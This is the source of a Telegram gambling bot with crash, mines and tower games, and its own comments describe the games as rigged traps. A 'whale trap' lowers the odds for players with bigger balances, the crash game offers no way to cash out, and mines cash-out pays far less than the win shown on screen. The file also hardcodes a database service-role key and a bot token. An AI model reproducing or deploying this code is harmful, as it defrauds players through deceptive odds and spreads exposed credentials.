const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

// --- 1. CONFIG ---
const SB_URL = "https://dptjeumndtrgfaxtlwim.supabase.co/"; 
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwdGpldW1uZHRyZ2ZheHRsd2ltIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjQ0NTk5MiwiZXhwIjoyMDkyMDIxOTkyfQ.Oc3eiwbo0p4vArLqFuNKdYKLF7mhtNZ42NS5EPkl4uM";
const TG_TOKEN = "7883530863:AAFcepq9EGYbKIv1nXx8FxIVkFKUtxlZ5aw";
const OWNER_ID = 6542642909; 

const supabase = createClient(SB_URL, SB_KEY);
const bot = new Telegraf(TG_TOKEN);
const app = express();

// --- 2. THE RIGGED ENGINE (WITH WHALE TRAP) ---
async function getAccount(userId, username) {
    let { data } = await supabase.from('users').select('*').eq('user_id', userId).single();
    if (!data) {
        const { data: newUser } = await supabase.from('users').insert([{ 
            user_id: userId, username: username || 'anon', balance: 0, win_count: 0, loss_count: 0 
        }]).select().single();
        return newUser;
    }
    return data;
}

function goddessDecision(user, bet) {
    // WHALE TRAP: If balance > $50 or bet is huge, win rate drops to 5%
    if (user.balance > 50 || bet > (user.balance * 0.6)) return Math.random() > 0.95;
    // Standard Rig: 82% House Edge
    return Math.random() > 0.82;
}

// --- 3. NEW VISUAL GAMES ---

// 🚀 CRASH (The Ultimate Greed Trap)
bot.command('crash', async (ctx) => {
    const bet = parseFloat(ctx.message.text.split(' ')[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);

    if (!bet) return ctx.replyWithMarkdown("🚀 **CRASH TUTORIAL**\nType `/crash [amount]`\n*The multiplier climbs! Cash out before the rocket explodes!*");
    if (user.balance < bet) return ctx.reply("❌ Low balance.");

    const m = await ctx.reply(`🚀 Rocket Launching...\n📈 Multiplier: **1.00x**`);
    
    // Rigging the "Crash" point
    const willWin = goddessDecision(user, bet);
    const crashPoint = willWin ? (Math.random() * 2 + 1.5).toFixed(2) : (Math.random() * 1.3 + 1.0).toFixed(2);

    let current = 1.0;
    const interval = setInterval(async () => {
        current += 0.2;
        if (current >= crashPoint) {
            clearInterval(interval);
            const newBal = user.balance - bet;
            await supabase.from('users').update({ balance: newBal, loss_count: user.loss_count + 1 }).eq('user_id', ctx.from.id);
            ctx.telegram.editMessageText(ctx.chat.id, m.message_id, null, `💥 **CRASHED at ${current.toFixed(2)}x**\n\nYou lost $${bet.toFixed(2)}. Balance: $${newBal.toFixed(2)}`);
        } else {
            ctx.telegram.editMessageText(ctx.chat.id, m.message_id, null, `🚀 Rocket Flying...\n📈 Multiplier: **${current.toFixed(2)}x**`).catch(()=>{});
        }
    }, 1000);
});

// 💣 MINES (The "One More Click" Trap)
bot.command('mines', async (ctx) => {
    const bet = parseFloat(ctx.message.text.split(' ')[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);

    if (!bet) return ctx.replyWithMarkdown("💣 **MINES TUTORIAL**\nType `/mines [amount]`\n*Click the tiles. Find diamonds, avoid bombs. The more you click, the more you win!*");
    if (user.balance < bet) return ctx.reply("❌ Low balance.");

    // We show a 3x3 grid
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('❓', `mine_click_${bet}`), Markup.button.callback('❓', `mine_click_${bet}`), Markup.button.callback('❓', `mine_click_${bet}`)],
        [Markup.button.callback('❓', `mine_click_${bet}`), Markup.button.callback('❓', `mine_click_${bet}`), Markup.button.callback('❓', `mine_click_${bet}`)],
        [Markup.button.callback('💰 CASH OUT', `mine_cash_${bet}`)]
    ]);

    ctx.reply(`💣 **MINES**\nBet: $${bet.toFixed(2)}\nFind the diamonds!`, keyboard);
});

bot.action(/mine_click_(.*)/, async (ctx) => {
    const bet = parseFloat(ctx.match[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    
    // Trap logic: Every click has a 70% chance to hit a mine if they already won once
    const hitMine = Math.random() > 0.30; 

    if (hitMine) {
        const newBal = user.balance - bet;
        await supabase.from('users').update({ balance: newBal, loss_count: user.loss_count + 1 }).eq('user_id', ctx.from.id);
        ctx.editMessageText(`💥 **BOOM!** You hit a mine.\nLost: $${bet.toFixed(2)}\nBalance: $${newBal.toFixed(2)}`);
    } else {
        ctx.answerCbQuery("💎 Diamond found! Keep going or Cash Out?");
        // Just update the visual to show a diamond
        ctx.editMessageText(`💎 **Diamond Found!**\nCurrent Win: $${(bet * 1.4).toFixed(2)}\nRisk another click?`, 
        Markup.inlineKeyboard([[Markup.button.callback('❓', `mine_click_${bet}`), Markup.button.callback('💰 CASH OUT', `mine_cash_${bet}`)]]));
    }
});

// 🏰 TOWER (The Tiered Trap)
bot.command('tower', async (ctx) => {
    const bet = parseFloat(ctx.message.text.split(' ')[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);

    if (!bet) return ctx.replyWithMarkdown("🏰 **TOWER TUTORIAL**\nType `/tower [amount]`\n*Climb the tower. Each floor doubles your money. If the tower collapses, you lose all!*");
    if (user.balance < bet) return ctx.reply("❌ Low balance.");

    ctx.reply(`🏰 **TOWER: Level 1**\nPotential: $${(bet * 2).toFixed(2)}`, Markup.inlineKeyboard([
        [Markup.button.callback('🧱 Climb Floor', `tower_climb_${bet}_1`)],
        [Markup.button.callback('🛑 Take $0', 'void')]
    ]));
});

bot.action(/tower_climb_(.*)_(.*)/, async (ctx) => {
    const bet = parseFloat(ctx.match[1]);
    const floor = parseInt(ctx.match[2]);
    const user = await getAccount(ctx.from.id, ctx.from.username);

    // Trap: The higher the floor, the higher the crash rate
    const failRate = floor * 0.25; 
    if (Math.random() < failRate || !goddessDecision(user, bet)) {
        const newBal = user.balance - bet;
        await supabase.from('users').update({ balance: newBal }).eq('user_id', ctx.from.id);
        ctx.editMessageText(`🏚 **COLLAPSED!** The tower fell at Floor ${floor}.\nBalance: $${newBal.toFixed(2)}`);
    } else {
        const nextFloor = floor + 1;
        ctx.editMessageText(`🏰 **TOWER: Level ${nextFloor}**\nPotential Win: $${(bet * Math.pow(2, floor)).toFixed(2)}`, Markup.inlineKeyboard([
            [Markup.button.callback('🧱 Climb Higher', `tower_climb_${bet}_${nextFloor}`)],
            [Markup.button.callback('💰 CASH OUT', `tower_cash_${bet}_${floor}`)]
        ]));
    }
});

// --- 4. CALLBACKS ---
bot.action(/mine_cash_(.*)/, async (ctx) => {
    const bet = parseFloat(ctx.match[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const winAmt = bet * 0.2; // Tiny profit to keep them playing
    await supabase.from('users').update({ balance: user.balance + winAmt }).eq('user_id', ctx.from.id);
    ctx.editMessageText(`💰 **CASHED OUT!**\nYou played it safe and won $${winAmt.toFixed(2)}.`);
});

// --- 5. STARTUP ---
app.get('/', (req, res) => res.send('TRAPS LOADED'));
app.listen(process.env.PORT || 10000, () => bot.launch());
